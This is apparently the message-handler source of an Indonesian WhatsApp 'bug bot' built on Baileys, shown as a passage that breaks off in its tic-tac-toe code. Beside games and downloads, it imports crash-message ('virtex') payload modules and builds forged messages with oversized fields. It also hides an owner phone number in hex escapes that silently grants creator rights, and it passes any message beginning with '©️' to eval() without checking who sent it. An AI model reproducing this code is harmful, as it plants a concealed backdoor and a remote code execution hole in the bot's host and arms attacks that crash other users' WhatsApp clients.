/*

› Create By King Sam
› Button by Tairo Makino

                 >
*/

//=================================================//
require('./hwkal')
const { 
       WA_DEFAULT_EPHEMERAL,
       getAggregateVotesInPollMessage, 
       generateWAMessageFromContent, 
       proto, 
       generateWAMessageContent, 
       generateWAMessage, 
       prepareWAMessageMedia, 
       downloadContentFromMessage, 
       areJidsSameUser, 
       getContentType 
      } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { apikey } = require('./apikey.json')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const hxz = require('hxz-api')
const ytdl = require("ytdl-core")
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const qbug = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: ` ◥◤◢◤ ★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?彡★◥◣◥◤ `
}
}
}
//VIRTEX 
const { ngazap } = require('./zetszet/virtex/ngazap')
const { buttonkal } = require('./zetszet/virtex/buttonkal')
const { jids1 } = require('./zetszet/virtex/jids1')
const { jids0 } = require('./zetszet/virtex/jids0')
const { cttl } = require('./zetszet/virtex/cttl')
const { tizi } = require('./zetszet/virtex/tizi')
const { weg } = require('./zetszet/virtex/weg')
const { virtex7 } = require('./zetszet/virtex/virtex7')
const { bugui } = require('./zetszet/virtex/bugui.js')
const { bugui2 } = require('./zetszet/virtex/bugui2.js')
const { monospace } = require('./zetszet/virtex/monospace.js')
const { bugcapt } = require('./zetszet/virtex/bugcapt.js')
const { ios1 } = require('./zetszet/virtex/ios1.js')
const { ios2 } = require('./zetszet/virtex/ios2.js')
const { cortanet } = require('./zetszet/virtex/cortanet.js')
const { mdelay } = require('./zetszet/virtex/mdelay.js')
const { zetsubonotgay } = require('./zetszet/virtex/zetsubonotgay.js')
const { zovcgay } = require('./zetszet/virtex/zovcgay.js')
const { zetxdgay } = require('./zetszet/virtex/zetxdgay.js')
const { restugay } = require('./zetszet/virtex/restugay.js')
const { zalgonal } = require('./zetszet/virtex/zalgonal.js')
//WHATSAPP SUPPORT
const { unban1 } = require('./support/unban1.js')
const { unban2 } = require('./support/unban2.js')
const { unban3 } = require('./support/unban3.js')
const { unban4 } = require('./support/unban4.js')
const { unban5 } = require('./support/unban5.js')
const { restotp } = require('./support/restotp.js')

const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []

const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const thumbnail = fs.readFileSync ('./kawai/imvillain.jpg')
const cewegw = fs.readFileSync(`./kawai/cewegw.jpg`)
const egirl = fs.readFileSync(`./kawai/egirl.jpg`)
const egao = fs.readFileSync(`./kawai/egao.jpg`)
const sagiri = fs.readFileSync(`./kawai/hinachan.jpg`)
const hinachan = fs.readFileSync(`./kawai/hinachann.jpg`)
const imvillain = fs.readFileSync(`./kawai/imvillain.jpg`)
const rimuruku = fs.readFileSync(`./kawai/rimuruku.jpg`)
const rimuwu = fs.readFileSync(`./kawai/rimuwu.jpg`)
const sangean = fs.readFileSync(`./kawai/sangean.jpg`)
const sikanna = fs.readFileSync(`./kawai/sikanna.jpg`)
const notprem = fs.readFileSync(`./kawai/notprem.webp`)
const kosongjpg = fs.readFileSync ('./zetszet/image/kosong.jpg')
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const owner = JSON.parse(fs.readFileSync('./premium.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const banned = JSON.parse(fs.readFileSync('./zetszet/dbnye/banned.json'))

virgam = fs.readFileSync(`./zetszet/image/deden.jpeg`)
//=================================================//
module.exports = zetsubo = async (zetsubo, m, chatUpdate, store) => {
 try {
//var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?                                                                                                                        m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix

//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const botNumber = await zetsubo.decodeJid(zetsubo.user.id)
const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
const isCreator = [author, botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await zetsubo.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const isBan = banned.includes(m.sender)
const isUser = pengguna.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const qtod = m.quoted? "true":"false"
const contactsss = JSON.parse(fs.readFileSync("./pushkont/contacts.json"))
const svcontact = JSON.parse(fs.readFileSync("./pushkont/svcontact.json"))
const isContacts = contactsss.includes(m.sender)
	    const moment = require("moment-timezone")
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss")
if(time2 < "20:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
}
if(time2 < "18:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐞𝐭𝐚𝐧𝐠"
 }
if(time2 < "15:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
 }
if(time2 < "12:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
}
if(time2 < "06:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
 }
if(time2 < "05:00:00"){
var ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
}
const wib = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const salam2 = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("a")

//=================================================//}
const zets = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid :"status@broadcast" }: {})},
 message:{"orderMessage":{"orderId":"174238614569438",
 "thumbnail":kosongjpg, //image 0kb
 "itemCount":999999999,
 "status":"INQUIRY","surface":"CATALOG","message":`⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}
 
const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}
const reply = (teks) => {
return zetsubo.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `༐༑⿻𝐒⸙𝐀࿈𝐌.𝐕𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑ - ${botname}`,"body": `Selamat ${salam2} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/565f8fc3e0cffb4a7ffd4.jpg',"thumbnail": thumbnail,"sourceUrl": `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`}}}, { quoted:m})} 

const zetsreply = async (teks) => {
	    zetsubo.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉`,
        renderLargerThumbnail:false,
        showAdAttribution: true, 
        mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg`,
        mediaType: 2, 
        thumbnail:sangean
        }}}, { quoted: zets })}

const virgamreply = async (teks) => {
	    zetsubo.sendMessage(bnnd, { text:teks, contextInfo: {externalAdReply : {
        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⸙⫺`,
        renderLargerThumbnail:false,
        showAdAttribution: true, 
        mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
        mediaType: 2, 
        thumbnail:virgam
        }}}, { quoted: kalgans })}

const genreply = async (teks) => {
	    zetsubo.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
        title : `⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺`,
        body : `⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉`,
        renderLargerThumbnail:false,
        showAdAttribution: true, 
        mediaUrl: `https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
        mediaType: 2, 
        thumbnail:hinachan
        }}}, { quoted: zets })} 
	 async function loadings () {
var lod = [
"☧",
"☫",
"✚",
"☫",
	"☸",
        "🧞‍♂️𝐏𝐨𝐧𝐠",	
"𝐉𝐈𝐍𝐈 🧞‍♂️"
]
let { key } = await zetsubo.sendMessage(from, {text: '🧞‍♂️𝐏𝐨𝐧𝐠'})

for (let i = 0; i < lod.length; i++) {
await zetsubo.sendMessage(from, {text: lod[i], edit: key });
}
	 }

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await zetsubo.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await zetsubo.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

async function loading () {
var hawemod = [

` ★彡 𝘾𝙇𝘼𝙎𝙎𝙄𝘾 𝙑3 彡★ `
]
let { key } = await zetsubo.sendMessage(from, {text: '@⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺.....'})//Pengalih isu

for (let i = 0; i < hawemod.length; i++) {
/*await delay(10)*/
await zetsubo.sendMessage(from, {text: hawemod[i], edit: key });//PESAN LEPAS
}
}

if (autodelete) {
zetsubo.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: mek.key.id,
participant: mek.key.participant
}
})
}

/*let reactionMessage = {
                    react: {
                        text: `〽️`,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                zetsubo.sendMessage(m.chat, reactionMessage)*/
//=================================================//
if (!zetsubo.public) {
if (!m.key.fromMe) return
}
let rn = ['recording'] 
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
zetsubo.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
if (isCmd && !isUser) {
pengguna.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
}
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await zetsubo.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return zetsubo.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return zetsubo.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return zetsubo.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await zetsubo.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
zetsubo.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:hw})
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: zetsubo.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, zetsubo.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
zetsubo.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await zetsubo.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}



const sendapk = (teks) => {
zetsubo.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk ZetsuboXygen*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
zetsubo.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
reply('*Rusak Bodoh !! Yang Bener Contoh : Yozip ZetsuboXygen*')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//

const senddocu = (teks) => {
zetsubo.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf CLASSIC-V3*')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
zetsubo.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted:m})
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
//=================================================//
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await zetsubo.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 
//=================================================//
if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
zetsubo.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 zetsubo.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}


//============= [LIST RESPONCE CHECKING START ]================
        if(m.mtype === "interactiveResponseMessage"){                                                                                                               console.log("interactiveResponseMessage Detected!")
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){                                                                                                           let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}
                if(id){
                    let emit_msg = {
                        key : { ...m.key } , // SET RANDOME MESSAGE ID                                                                                                          message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return zetsubo.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//============= [LIST RESPONCE CHECKING END ]================


//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
